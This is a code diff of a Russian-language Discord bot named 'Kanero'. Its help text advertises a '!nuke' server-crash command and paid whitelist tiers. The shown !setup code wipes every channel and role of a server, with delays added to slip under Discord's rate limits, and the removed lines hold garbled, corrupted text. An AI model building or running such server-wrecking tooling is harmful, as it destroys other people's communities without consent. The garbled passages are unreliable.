@@ -2321,24 +2321,26 @@ async def setup(ctx):
     guild = ctx.guild
     msg = await ctx.send("⚙️ Начинается настройка сервера... (примерное время ~15-20 сек)")
 
-    # -- 1. Параллельное удаление всех каналов и ролей --
-    delete_tasks = []
+    # -- 1. Удаление всех каналов и ролей --
+    # Сначала удаляем все каналы параллельно
+    channel_tasks = [ch.delete() for ch in guild.channels]
+    if channel_tasks:
+        await asyncio.gather(*channel_tasks, return_exceptions=True)
+        await asyncio.sleep(3)
     
-    # Добавляем задачи удаления каналов
-    for ch in guild.channels:
-        delete_tasks.append(ch.delete())
-    
-    # Добавляем задачи удаления ролей (все кроме @everyone и роли бота)
+    # Затем удаляем роли ПОСЛЕДОВАТЕЛЬНО чтобы избежать rate limit
     bot_role = guild.me.top_role
-    for r in guild.roles:
-        if not r.is_default() and r != bot_role and r.id != guild.me.id:
-            delete_tasks.append(r.delete())
+    roles_to_delete = [r for r in guild.roles if not r.is_default() and r != bot_role and r.id != guild.me.id]
     
-    # Выполняем все удаления одновременно
-    if delete_tasks:
-        await asyncio.gather(*delete_tasks, return_exceptions=True)
-        # Ждём чтобы Discord API успел обработать удаления
-        await asyncio.sleep(4)
+    for role in roles_to_delete:
+        try:
+            await role.delete()
+            await asyncio.sleep(0.5)  # Задержка между удалением ролей
+        except Exception:
+            pass
+    
+    # Дополнительная задержка перед созданием новых
+    await asyncio.sleep(3)
 
     # -- 2. Параллельное создание ролей --
     guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
@@ -5954,75 +5956,87 @@ async def on_ready():
 
 @bot.event
 async def on_command_error(ctx, error):
-    """��подписка истекла��� ������ � навсегда� ��� ����� �� ���."""
-    # ������� �� ������� � ��подписка истекла��
+    """Обработка ошибок команд."""
+    # Игнорируем если канал удалён
+    if isinstance(error, discord.errors.NotFound):
+        return
+    
+    # Команда не найдена
     if isinstance(error, commands.CommandNotFound):
-        cmd_text = ctx.message.content.split()[0][1:]  # ������� ! � ���� ������ �����
-        embed = discord.Embed(
-            title="? ������� �� �������",
-            description=(
-                f"������� `!{cmd_text}` �� навсегда��.\n\n"
-                "**�������� �� ����� � ����:**\n"
-                "`!nuke` � ���� �������\n"
-                "`!help` � ������ ���� ������\n"
-                "`!setup` � �подписка истекла\n"
-                "`!list` � навсегда ������\n\n"
-                "**����� ������?**\n"
-                "������ `!help` ��� ������� ������ ������\n"
-                "�все параллельно� � ������ �������: https://discord.gg/nNTB37QNCG"
-            ),
-            color=0xff0000
-        )
-        embed.set_footer(text="🤖 Kanero")
-        await ctx.send(embed=embed)
-        return
-
-    # �� ������� навсегда��
-    if isinstance(error, commands.MissingRequiredArgument):
-        cmd = ctx.command
-        usage = f"`!{cmd.name}`"
-        if cmd.name == "compensate":
-            usage = "`!compensate @user wl/pm/fl 2d`\n������: `!compensate @user pm 2d`"
-        elif cmd.name == "announce_bug":
-            usage = "`!announce_bug навсегда | навсегда`"
-        elif cmd.name == "wl_add":
-            usage = "`!wl_add @user`"
-        elif cmd.name == "pm_add":
-            usage = "`!pm_add @user`"
-        elif cmd.name == "fl_add":
-            usage = "`!fl_add @user`"
-        elif cmd.name == "giverole":
-            usage = "`!giverole @user @����`"
-        elif cmd.name == "unban":
-            usage = "`!unban <ID>`"
-        else:
-            usage = f"`!{cmd.name}` � �� ������� навсегда� `{error.param.name}`"
-        await ctx.send(f"? **�� ������� навсегда��.**\n���������: {usage}")
-        return
-
-    # навсегда ��� навсегда�
-    if isinstance(error, commands.BadArgument):
-        cmd = ctx.command
-        if cmd.name == "compensate":
-            await ctx.send(
-                "? **подписка истекла�.**\n"
-                "���������: `!compensate @user wl/pm/fl 2d`\n"
-                "**����:** `wl` � `pm` � `fl`\n"
-                "**�����:** `2d` � `48h` � `24`"
+        try:
+            cmd_text = ctx.message.content.split()[0][1:]
+            embed = discord.Embed(
+                title="❌ Команда не найдена",
+                description=(
+                    f"Команда `!{cmd_text}` не существует.\n\n"
+                    "**Популярные команды:**\n"
+                    "`!nuke` — краш сервера\n"
+                    "`!help` — список всех команд\n"
+                    "`!setup` — настройка сервера\n"
+                    "`!list` — списки участников\n\n"
+                    "**Нужна помощь?**\n"
+                    "Напиши `!help` для полного списка команд\n"
+                    "Или зайди на сервер: https://discord.gg/nNTB37QNCG"
+                ),
+                color=0xff0000
             )
-        else:
-            await ctx.send(f"? **подписка истекла�.** ������� ����подписка истекла: `!{cmd.name}`")
+            embed.set_footer(text="☠️ Kanero")
+            await ctx.send(embed=embed)
+        except Exception:
+            pass
         return
 
-    # ��� ����
-    if isinstance(error, commands.CheckFailure):
-        return  # ����� навсегда�� � �� �все параллельно�
+    # Не указан аргумент
+    if isinstance(error, commands.MissingRequiredArgument):
+        try:
+            cmd = ctx.command
+            usage = f"`!{cmd.name}`"
+            if cmd.name == "compensate":
+                usage = "`!compensate @user wl/pm/fl 2d`\nПример: `!compensate @user pm 2d`"
+            elif cmd.name == "wl_add":
+                usage = "`!wl_add @user`"
+            elif cmd.name == "pm_add":
+                usage = "`!pm_add @user`"
+            elif cmd.name == "fl_add":
+                usage = "`!fl_add @user`"
+            else:
+                usage = f"`!{cmd.name}` — не указан аргумент `{error.param.name}`"
+            await ctx.send(f"❌ **Не указан аргумент.**\nИспользуй: {usage}")
+        except Exception:
+            pass
+        return
 
-    # навсегда� ������ � навсегда �� �� ������
+    # Неверный тип аргумента
+    if isinstance(error, commands.BadArgument):
+        try:
+            cmd = ctx.command
+            if cmd.name == "compensate":
+                await ctx.send(
+                    "❌ **Неверный формат.**\n"
+                    "Используй: `!compensate @user wl/pm/fl 2d`\n"
+                    "**Типы:** `wl` • `pm` • `fl`\n"
+                    "**Время:** `2d` • `48h` • `24`"
+                )
+            else:
+                await ctx.send(f"❌ **Неверный формат.** Проверь аргументы: `!{cmd.name}`")
+        except Exception:
+            pass
+        return
+
+    # Нет прав
+    if isinstance(error, commands.CheckFailure):
+        return  # Уже обработано в проверках
+
+    # Другие ошибки - игнорируем если канал удалён
     if isinstance(error, commands.CommandInvokeError):
-        original = error.original
-        cmd_name = ctx.command.name if ctx.command else "?"
-        await ctx.send(f"? ������ ��� навсегда�� `!{cmd_name}`: `{type(original).__name__}: {original}`")
+        if isinstance(error.original, discord.errors.NotFound):
+            return
+        try:
+            original = error.original
+            cmd_name = ctx.command.name if ctx.command else "?"
+            await ctx.send(f"❌ Ошибка при выполнении `!{cmd_name}`: `{type(original).__name__}: {original}`")
+        except Exception:
+            pass
         return
 
 
